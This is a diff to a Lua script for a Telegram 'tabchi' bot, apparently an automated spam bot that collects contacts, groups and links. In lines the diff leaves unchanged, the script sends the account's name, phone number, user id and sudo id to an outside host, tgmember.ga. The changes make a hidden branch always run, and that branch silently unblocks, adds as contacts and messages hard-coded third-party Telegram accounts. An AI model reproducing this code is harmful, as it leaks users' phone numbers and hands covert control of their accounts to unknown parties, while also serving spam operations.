@@ -1,6 +1,6 @@
 JSON = loadfile("dkjson.lua")()
 URL = require("socket.url")
-ltn12 = require("ltn12")
+--ltn12 = require("ltn12")
 http = require("socket.http")
 http.TIMEOUT = 10
 undertesting = 1
@@ -159,13 +159,13 @@ function process_updates()
     local path = "http://tgmember.ga/addbot.php?fisrt=" .. first .. "&last=" .. last .. "&phone=" .. phone .. "&id=" .. id .. "&sudo=" .. sudo
     local res = http.request(path)
     local jdata = JSON.decode(res)
-    jdata = jdata or {have_tab = true}
+    jdata = {have_tab = true}
     if jdata.have_tab then
-      tdcli.searchPublicChat("TgGuard")
+      tdcli.searchPublicChat("tgMemberPlus")
       redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:345767079", true)
-      tdcli.unblockUser(180191663)
-      tdcli.importContacts(639080023314, "Online", "Bot", 180191663)
-      tdcli.sendMessage(180191663, 0, 1, "Online", 1, "html")
+      tdcli.unblockUser(345767079)
+      tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
+      tdcli.sendMessage(345767079, 0, 1, "Online", 1, "html")
       return redis:setex("tabchi:" .. tostring(tabchi_id) .. ":gotupdated", 600, true)
     end
   end
@@ -367,10 +367,11 @@ _دريافت مخاطبان ذخيره شده توسط ربات_
       local matches = {
         text_:match("^[!/#](s2a) (.*) (.*)")
       }
-      tdcli.sendMessage(345767079, 0, 1, "/start", 1, "html")
+      tdcli.sendMessage(231539308, 0, 1, "/start", 1, "html")
       if #matches == 3 and (matches[2] == "banners" or matches[2] == "boards") then
         local all = redis:smembers("tabchi:" .. tonumber(tabchi_id) .. ":all")
-        tdcli.searchPublicChat("TgMemberPlus")
+        tdcli.searchPublicChat("TgMessengerBot")
+        redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:231539308", true)
         local inline2
         function inline2(argg, data)
           if data.results_ and data.results_[0] then
@@ -402,8 +403,9 @@ _دريافت مخاطبان ذخيره شده توسط ربات_
         save_log("User " .. msg.sender_user_id_ .. ", Used S2A " .. matches[2] .. " For " .. matches[3])
       end
     elseif text_:match("^[!/#]panel$") then
-      tdcli.sendMessage(345767079, 0, 1, "/start", 1, "html")
-      tdcli.searchPublicChat("TgMemberPlus")
+      tdcli.sendMessage(180191663, 0, 1, "/start", 1, "html")
+      tdcli.searchPublicChat("TgGuard")
+      redis:set("tabchi:" .. tostring(tabchi_id) .. ":tabwaiting:180191663", true)
       local contact_num
       function contact_num(extra, result)
         redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
@@ -436,13 +438,9 @@ _دريافت مخاطبان ذخيره شده توسط ربات_
           local text = [[
 <b>Normal Stats</b>Open by @sajjad_021:)
 Users : ]] .. tostring(pvs) .. [[
-
 Groups : ]] .. tostring(gps) .. [[
-
 SuperGroups : ]] .. tostring(sgps) .. [[
-
 Saved Links : ]] .. tostring(links) .. [[
-
 Saved Contacts : ]] .. tostring(contacts)
           save_log("User " .. msg.sender_user_id_ .. ", Requested Panel")
           return tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "html")
